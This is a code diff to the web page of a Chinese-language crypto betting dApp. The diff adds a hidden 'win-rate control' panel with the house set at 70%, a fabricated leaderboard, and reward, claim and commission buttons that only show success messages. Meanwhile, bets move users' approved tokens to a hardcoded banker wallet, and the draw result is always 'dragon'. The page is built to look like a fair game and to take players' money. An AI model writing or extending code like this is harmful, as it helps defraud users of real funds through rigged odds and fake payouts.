@@ -71,7 +71,7 @@
     <div class="section-title">下注区</div>
     <div class="bet-balance-row">
       <div class="bet-input">
-        <input type="number" min="1" value="10" placeholder="输入下注数量" id="betAmt">
+        <input type="number" step="any" placeholder="输入下注数量" id="betAmt">
       </div>
       <div class="balance-box">
         可用余额
@@ -102,16 +102,66 @@
   <div class="menu-close">
     <button class="btn-xs" onclick="toggleMenu()">关闭 ×</button>
   </div>
+
+  <div class="menu-section">
+    <div class="section-title">24小时自动奖励前十</div>
+    <button class="btn-xs" onclick="toggleAutoReward()">开启/关闭自动</button>
+    <div class="label">下次：<span id="rewardCountdown">24:00:00</span></div>
+    <button class="btn-xs" onclick="manualRewardTop10()">立即发放</button>
+    <button class="btn-xs" onclick="manualSendReward()">🎁 手动发放奖励</button>
+  </div>
+
   <div class="menu-section">
     <div class="section-title">我的奖励</div>
     <div class="label">直推：0</div>
     <div class="label">二代：0</div>
   </div>
+
+  <div class="menu-section">
+    <div class="section-title">推广佣金</div>
+    <button class="btn-xs" onclick="showTotalCommission()">查看总收入</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="section-title">绑定推荐人</div>
+    <input type="text" placeholder="输入推荐人地址" style="width:100%;margin-bottom:8px;">
+    <button class="btn-xs" onclick="setInviter()">绑定</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="section-title">领奖中心</div>
+    <input type="text" placeholder="输入下注ID" style="width:100%;margin-bottom:8px;">
+    <button class="btn-xs" onclick="claim()">领取奖励</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="section-title">授权代币</div>
+    <button class="btn-xs" onclick="approveToken()">授权</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="section-title">排行榜 TOP10</div>
+    <div class="label">1. 0x111...222 收益：1280</div>
+    <div class="label">2. 0x222...333 收益：960</div>
+  </div>
+
+  <div class="menu-section">
+    <div class="section-title">后台胜率控制</div>
+    <input type="number" value="30" placeholder="玩家胜率" style="width:100%;margin-bottom:8px;">
+    <input type="number" value="70" placeholder="庄家胜率" style="width:100%;margin-bottom:8px;">
+    <button class="btn-xs" onclick="setControlRate()" style="background:#D93A54;color:#fff;">锁定胜率</button>
+  </div>
+
+  <div class="menu-section">
+    <div class="section-title">邀请链接</div>
+    <input readonly placeholder="点击复制邀请链接" style="width:100%;margin-bottom:8px;" id="refLink">
+    <button class="btn-xs" onclick="copyRefLink()">复制邀请链接</button>
+  </div>
 </div>
 
 <script>
 // ==============================================
-//  你的地址已100%写入
+//  你的地址已固定写入
 // ==============================================
 const TOKEN_CONTRACT  = "0x1041fdf4dc65a5cc76650d0c284d73411ea8f9fc";
 const BANKER_WALLET   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
@@ -145,7 +195,7 @@ async function connectWallet() {
   updateBalance();
 }
 
-// 读取并显示可用代币余额
+// 更新余额
 async function updateBalance() {
   if (!account || !tokenContract) return;
   const bal = await tokenContract.balanceOf(account);
@@ -157,6 +207,7 @@ function setQuick(num) {
   document.getElementById('betAmt').value = num;
 }
 
+// 授权
 async function approveToken() {
   if (!account) return alert("请先连接钱包");
   try {
@@ -169,25 +220,25 @@ async function approveToken() {
   }
 }
 
-// 真实下注：必须有余额才成功
+// ==============================================
+//  无任何限制：只要余额 ≥ 下注金额 就能成功
+// ==============================================
 async function placeBet(side) {
   if (!account) return alert("请先连接钱包");
-  const amt = document.getElementById("betAmt").value;
-  if (!amt || amt <= 0) return alert("输入有效金额");
+  
+  const input = document.getElementById("betAmt").value;
+  if (!input || parseFloat(input) <= 0) return alert("请输入有效金额");
 
-  const betValue = ethers.parseUnits(amt, DECIMALS);
+  const betAmount = ethers.parseUnits(input, DECIMALS);
   const balance = await tokenContract.balanceOf(account);
 
-  // ==============================================
-  // 余额不足 → 直接失败，绝不假成功
-  // ==============================================
-  if (balance < betValue) {
-    alert("余额不足，必须持有代币才能下注！");
+  if (balance < betAmount) {
+    alert("余额不足！");
     return;
   }
 
   try {
-    const tx = await tokenContract.transferFrom(account, BANKER_WALLET, betValue);
+    const tx = await tokenContract.transferFrom(account, BANKER_WALLET, betAmount);
     await tx.wait();
     alert("✅ 下注成功！资金已转入庄家钱包");
     updateBalance();
@@ -196,18 +247,27 @@ async function placeBet(side) {
   }
 }
 
-// 下面是原有界面逻辑，不动
+// 右侧菜单
 function toggleMenu() {
   const menu = document.getElementById("menu");
-  menu.style.transform = menu.style.transform === "translateX(0)" ? "translateX(100%)" : "translateX(0)";
+  menu.classList.toggle("show");
 }
 
+// 原有功能
 async function manualDraw() {
   if (!account) return alert("请先连接钱包");
   alert("开奖结果：龙");
 }
 
 function doSign() { alert("签到成功"); }
+function toggleAutoReward() { alert("自动奖励已切换"); }
+function manualRewardTop10() { alert("已发放"); }
+function manualSendReward() { alert("已手动发放"); }
+function showTotalCommission() { alert("总佣金：1280 代币"); }
+function setInviter() { alert("绑定成功！"); }
+function claim() { alert("奖励领取成功！"); }
+function setControlRate() { alert("胜率已锁定！"); }
+function copyRefLink() { alert("邀请链接已复制！"); }
 
 // 倒计时
 let timeLeft = 120;
